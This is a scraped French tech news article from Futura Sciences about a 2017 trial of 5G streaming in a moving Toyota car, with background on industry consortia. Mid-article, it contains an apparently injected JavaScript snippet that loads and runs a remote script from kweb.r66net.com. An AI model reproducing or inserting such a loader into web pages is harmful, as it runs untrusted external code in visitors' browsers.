{"title": "Bientot la 5G en voiture ?", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-11-07", "content": "Intel, Ericsson, Toyota, Denso et l'operateur NTT DoCoMo viennent de realiser un essai de connexion 5G dans une voiture circulant a 30 km/h. Grace a un debit de 1 Gbit/s, il a ete possible de lire une video Ultra HD en  streaming . L'un des domaines dans lesquels la 5G est amenee a jouer un role determinant est celui des vehicules connectes et autonomes. La  masse  de donnees qu'ils produiront, tant pour leur navigation que pour les services proposes aux passagers, va necessiter des debits non seulement tres importants mais aussi stables malgre la  vitesse  de deplacement. Au japon,  Intel , Ericsson,  Toyota , Denso et l'operateur  NTT DoCoMo  viennent de mener un essai concluant d'une connexion 5G a bord d'une  voiture . Le  debit  de 1 Gbit/s (montant) et de 600 Mbit/s (descendant) a permis de lire en flux continu ( streaming ) une video de qualite  Ultra HD  4K alors que la Toyota Alphard circulait a 30 km/h.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Intel testera la 5G aux Jeux olympiques d'hiver 2018 Intel a fourni l'electronique embarquee ainsi que l'antenne placee sur le  toit  de la voiture, Ericsson les stations de base et  NTT  DoCoMo l'environnement reseau 5G. La Coree du Sud et le Japon ont d'ores et deja annonce vouloir offrir une premiere experimentation grandeur nature de cette nouvelle technologie a l'occasion des Jeux olympiques d'hiver 2018, a Pyeongchang (Coree du Sud), et d'ete 2020, a Tokyo. En tant que sponsor des JO d'hiver, Intel deploiera un reseau experimental en 5G a Pyeongchang. Cet ete, Toyota, NTT DoCoMo, Intel, Ericsson et Denso ont cree un consortium ( Automotive Edge Computing ) en vue de definir et d'elaborer les architectures informatiques et reseaux a meme d'accompagner l'essor des vehicules connectes et autonomes qui sont amenes a generer de tres grandes quantites de donnees. Ils sont egalement reunis dans la  5G Automotive Association  ( 5GAA ) aux cotes d'Audi, BMW, Huawei, Nokia et Qualcomm afin de developper, tester et promouvoir des standards de la 5G. Rappelons qu'en debut d'annee,  Orange  et l'equipementier Ericsson ont reussi un test en laboratoire d'une communication 5G qui a passe le cap des 10 Gbit/s. Le deploiement commercial de la 5G est annonce vers 2020. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest", "theme": "tech"}